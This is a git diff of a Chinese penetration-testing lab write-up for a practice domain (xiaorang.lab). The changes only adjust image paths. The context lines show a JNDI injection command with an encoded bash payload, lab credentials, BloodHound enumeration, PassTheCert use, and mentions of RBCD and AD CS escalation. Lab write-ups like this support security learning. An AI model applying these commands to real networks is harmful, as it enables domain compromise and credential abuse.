@@ -40,7 +40,7 @@ java -jar JNDI-Injection-Exploit-Plus-2.5-SNAPSHOT-all.jar -C "bash -c {echo,YmF
 
 工具有点问题，最后还是用无敌的 Java Chains 打通了。
 
-![](b17a28db-aaf9-4e7b-ba42-5a3029e512a8.png)
+![](../assets/b17a28db-aaf9-4e7b-ba42-5a3029e512a8.png)
 
 PoC 数据包如下。
 
@@ -302,9 +302,9 @@ Yes, you have enumerated smb. But do you know what an SPN is?
 
 根据从 SMB 中拿到的数据库，我们可以获取到两个关键数据，分别是用户名和可能的密码。
 
-![](52b59a80ada969c3b5df67494b793abe.png)
+![](../assets/52b59a80ada969c3b5df67494b793abe.png)
 
-![](ec4e9c4f-98c2-4fb4-8203-8607ebeb41cf.png)
+![](../assets/ec4e9c4f-98c2-4fb4-8203-8607ebeb41cf.png)
 
 也就是说，下面，我们导出这些用户名之后，要尝试将密码和用户对应上，去登录其他主机。
 
@@ -360,7 +360,7 @@ xiaorang.lab\chenchen:@Passw0rd@
 proxychains4 bloodhound-python -c all -u 'zhangxia' -p 'MyPass2@@6' -d xiaorang.lab -ns 172.22.9.7 --zip --dns-tcp
 ```
 
-![](12af9c8029c5ec7425852df6aff67138.png)
+![](../assets/12af9c8029c5ec7425852df6aff67138.png)
 
 我们发现 `ZHANGXIA@XIAORANG.LAB` 对 `XIAORANG-DC.XIAORANG.LAB` 具有 GenericWrite 权限，也就是说我们在这里可以打 RBCD，这个在之后横向移动到 DC 服务器的时候有需要用到，同时，根据之前的信息收集，我们还注意到域内存在 AD CS，也就是说我们可以去用这个证书服务的漏洞去提权。
 
@@ -470,7 +470,7 @@ proxychains4 python3 /home/lucifer/Tools/PassTheCert/Python/passthecert.py -acti
 
 我们发现，确实能以管理员的身份登录到服务器中了。
 
-![](4cf566eb0b15ffef8b42adbbdbe57e42.png)
+![](../assets/4cf566eb0b15ffef8b42adbbdbe57e42.png)
 
 然后我们去打 RBCD，将证书配置进去。
 
